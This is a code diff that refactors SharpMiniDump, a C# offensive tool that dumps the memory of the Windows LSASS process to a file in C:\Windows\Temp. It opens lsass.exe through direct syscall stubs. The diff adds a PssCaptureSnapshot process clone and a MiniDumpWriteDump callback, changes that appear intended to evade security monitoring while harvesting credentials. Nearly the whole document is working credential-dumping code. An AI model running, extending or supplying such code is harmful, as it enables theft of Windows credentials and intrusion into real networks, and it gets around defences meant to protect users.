@@ -7,15 +7,22 @@
 using System;
 using System.ComponentModel;
 using System.Diagnostics;
+using System.IO;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 namespace SharpMiniDump
 {
-    class Program
+    
+    public class Program
     {
         static void Main(string[] args)
         {
+            Execute(args);
+        }
 
+        public static void Execute(string[] args)
+        {
             if (IntPtr.Size != 8)
             {
                 return;
@@ -34,13 +41,7 @@ namespace SharpMiniDump
             Natives.OSVERSIONINFOEXW osInfo = new Natives.OSVERSIONINFOEXW();
             osInfo.dwOSVersionInfoSize = Marshal.SizeOf(osInfo);
 
-            //I know, this is not realy needed but today I have fun on run stuff dynamically :D
-            IntPtr ntdll = Natives.LoadLibraryA("ntdll.dll");
-            IntPtr proc = Natives.GetProcAddress(ntdll, "RtlGetVersion");
-
-            NativeSysCall.Delegates.RtlGetVersion RtlGetVersion = (NativeSysCall.Delegates.RtlGetVersion)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.RtlGetVersion));
-
-            RtlGetVersion(ref osInfo);
+            Natives.RtlGetVersion(ref osInfo);
 
             pWinVerInfo.chOSMajorMinor = osInfo.dwMajorVersion + "." + osInfo.dwMinorVersion;
 
@@ -53,10 +54,7 @@ namespace SharpMiniDump
 
             pWinVerInfo.SystemCall = 0x3F;
 
-            proc = Natives.GetProcAddress(ntdll, "RtlInitUnicodeString");
-
-            NativeSysCall.Delegates.RtlInitUnicodeString RtlInitUnicodeString = (NativeSysCall.Delegates.RtlInitUnicodeString)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.RtlInitUnicodeString));
-            RtlInitUnicodeString(ref pWinVerInfo.ProcName, @"lsass.exe");
+            Natives.RtlInitUnicodeString(ref pWinVerInfo.ProcName, @"lsass.exe");
             pWinVerInfo.hTargetPID = (IntPtr)Process.GetProcessesByName("lsass")[0].Id;
 
             pWinVerInfo.lpApiCall = "NtReadVirtualMemory";
@@ -74,7 +72,7 @@ namespace SharpMiniDump
             IntPtr hProcess = IntPtr.Zero;
 
             Natives.OBJECT_ATTRIBUTES objAttribute = new Natives.OBJECT_ATTRIBUTES();
-            // objAttribute.ObjectName = null;
+
 
             var status = NativeSysCall.ZwOpenProcess10(ref hProcess, Natives.ProcessAccessFlags.All, objAttribute, ref clientid);
 
@@ -84,8 +82,33 @@ namespace SharpMiniDump
                 return;
             }
 
+            Console.WriteLine("[*] ZwOpenProcess10  " + status);
+
+            Natives.PSS_CAPTURE_FLAGS flags = Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY_OPTIONAL
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_USE_VM_ALLOCATIONS
+        | Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_RELEASE_SECTION;
+
+            IntPtr SnapshotHandle = IntPtr.Zero;
+            int pss = Natives.PssCaptureSnapshot(hProcess,flags, 1048607,ref SnapshotHandle);
+            Console.WriteLine("[*] PssCaptureSnapshot " + pss);
+            if (SnapshotHandle == IntPtr.Zero)
+            {
+                Console.WriteLine("[x] Error PssCaptureSnapshot  ");
+                return;
+            }
+
             Natives.UNICODE_STRING uFileName = new Natives.UNICODE_STRING();
-            RtlInitUnicodeString(ref uFileName, @"\??\C:\Windows\Temp\dumpert.dmp");
+            Natives.RtlInitUnicodeString(ref uFileName, @"\??\C:\Windows\Temp\dumpert.dmp");
 
             Microsoft.Win32.SafeHandles.SafeFileHandle hDmpFile;
             IntPtr hElm = IntPtr.Zero;
@@ -129,10 +152,13 @@ namespace SharpMiniDump
                 return;
             }
 
-            IntPtr Dbghelp = Natives.LoadLibraryA("Dbghelp.dll");
-            proc = Natives.GetProcAddress(Dbghelp, "MiniDumpWriteDump");
+            
+            Natives.MINIDUMP_CALLBACK_INFORMATION CallbackInfo = new Natives.MINIDUMP_CALLBACK_INFORMATION();
+            CallbackInfo.CallbackRoutine = Program.MyMiniDumpWriteDumpCallback;
+            CallbackInfo.CallbackParam = IntPtr.Zero;
 
-            NativeSysCall.Delegates.MiniDumpWriteDump MiniDumpWriteDump = (NativeSysCall.Delegates.MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.MiniDumpWriteDump));
+            IntPtr pCallbackInfo = Marshal.AllocHGlobal(Marshal.SizeOf(CallbackInfo));
+            Marshal.StructureToPtr(CallbackInfo, pCallbackInfo, false);
 
             IntPtr ExceptionParam = IntPtr.Zero;
             IntPtr UserStreamParam = IntPtr.Zero;
@@ -140,8 +166,8 @@ namespace SharpMiniDump
 
             Console.WriteLine("[*] Target PID " + pWinVerInfo.hTargetPID);
             Console.WriteLine("[*] Generating minidump.... " + pWinVerInfo.hTargetPID);
-
-            if (!MiniDumpWriteDump(hProcess, (uint)pWinVerInfo.hTargetPID, hDmpFile, 2, ExceptionParam, UserStreamParam, CallbackParam))
+            
+            if (!Natives.MiniDumpWriteDump(SnapshotHandle, (uint)pWinVerInfo.hTargetPID, hDmpFile, 2, ExceptionParam, UserStreamParam, pCallbackInfo))
             {
                 Console.WriteLine("[x] Error MiniDumpWriteDump  ");
                 NativeSysCall.ZwClose10(hProcess);
@@ -160,7 +186,7 @@ namespace SharpMiniDump
             byte[] AssemblyBytes = { 0x4C, 0x8B, 0xD1, 0xB8, 0xFF };
             AssemblyBytes[4] = (byte)pWinVerInfo.SystemCall;
 
-            IntPtr ntdll = Natives.LoadLibraryA("ntdll.dll");
+            IntPtr ntdll = Natives.LoadLibrary("ntdll.dll");
             IntPtr proc = Natives.GetProcAddress(ntdll, pWinVerInfo.lpApiCall);
 
             IntPtr lpBaseAddress = proc;
@@ -216,29 +242,33 @@ namespace SharpMiniDump
 
         private static bool TokenIsElevated(IntPtr hToken)
         {
-            //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
-            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(UInt32));
-            IntPtr tokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UInt32)));
+            Natives.TOKEN_ELEVATION tk = new Natives.TOKEN_ELEVATION();
+            tk.TokenIsElevated = 0;
+            
+            IntPtr lpValue = Marshal.AllocHGlobal(Marshal.SizeOf(tk));
+            Marshal.StructureToPtr(tk, lpValue, false);
+
+            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(Natives.TOKEN_ELEVATION));
             UInt32 returnLength;
 
             Boolean result = Natives.GetTokenInformation(
                 hToken,
-                Natives.TOKEN_INFORMATION_CLASS.TokenElevationType,
-                tokenInformation,
+                Natives.TOKEN_INFORMATION_CLASS.TokenElevation,
+                lpValue,
                 tokenInformationLength,
                 out returnLength
             );
 
-            switch ((Natives.TOKEN_ELEVATION_TYPE)Marshal.ReadInt32(tokenInformation))
+            Natives.TOKEN_ELEVATION elv = (Natives.TOKEN_ELEVATION)Marshal.PtrToStructure(lpValue, typeof(Natives.TOKEN_ELEVATION));
+            
+            if (elv.TokenIsElevated == 1)
+            {             
+                return true;
+            }
+            else
             {
-                case Natives.TOKEN_ELEVATION_TYPE.TokenElevationTypeDefault:
-                    return false;
-                case Natives.TOKEN_ELEVATION_TYPE.TokenElevationTypeFull:
-                    return true;
-                case Natives.TOKEN_ELEVATION_TYPE.TokenElevationTypeLimited:
-                    return false;
-                default:
-                    return true;
+
+                return false;
             }
         }
 
@@ -273,5 +303,15 @@ namespace SharpMiniDump
             return true;
         }
 
+        private static bool MyMiniDumpWriteDumpCallback(IntPtr CallbackParam, ref Natives.MINIDUMP_CALLBACK_INPUT CallbackInput, ref Natives.MINIDUMP_CALLBACK_OUTPUT CallbackOutput)
+        {
+            switch (CallbackInput.CallbackType)
+	        {
+	        case Natives.MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback: // IsProcessSnapshotCallback
+                CallbackOutput.Status = 1;
+		        break;
+	        }
+	        return true;
+        }
     }
 }
